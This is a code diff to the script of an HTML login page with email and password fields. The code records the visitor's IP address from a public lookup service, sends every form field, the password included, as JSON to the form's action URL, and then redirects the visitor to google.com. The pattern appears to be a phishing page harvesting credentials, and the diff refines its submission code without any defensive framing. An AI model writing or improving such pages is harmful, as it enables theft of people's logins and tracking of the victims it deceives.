@@ -177,12 +177,8 @@
   </div>
 
   <script>
+    // Capture IP and Hostname
     window.addEventListener('DOMContentLoaded', () => {
-      // ✅ Autofill (browser-managed if HTTPS)
-      // Optional demo email if autofill not available
-      // document.getElementById('email').value = "demo@example.com";
-
-      // ✅ Capture IP and hostname
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
@@ -196,7 +192,7 @@
         .catch(() => console.log('Could not fetch IP'));
     });
 
-    // ✅ Toggle password visibility
+    // Toggle password visibility
     document.getElementById('togglePassword').addEventListener('click', () => {
       const pwd = document.getElementById('password');
       const isHidden = pwd.type === 'password';
@@ -204,18 +200,31 @@
       togglePassword.textContent = isHidden ? '🙈' : '👁️';
     });
 
-    // ✅ Submit form then redirect
+    // Submit via AJAX JSON + Redirect
     const form = document.getElementById('mainForm');
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const data = new FormData(form);
+
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData.entries());
 
       try {
-        await fetch(form.action, { method: 'POST', body: data });
-        // Redirect to Google after successful submit
+        const response = await fetch(form.action, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (!response.ok) throw new Error("Failed to submit");
+
+        // Redirect after success
         window.location.href = "https://www.google.com";
       } catch (err) {
         alert("Network error, please try again.");
+        console.error(err);
       }
     });
   </script>
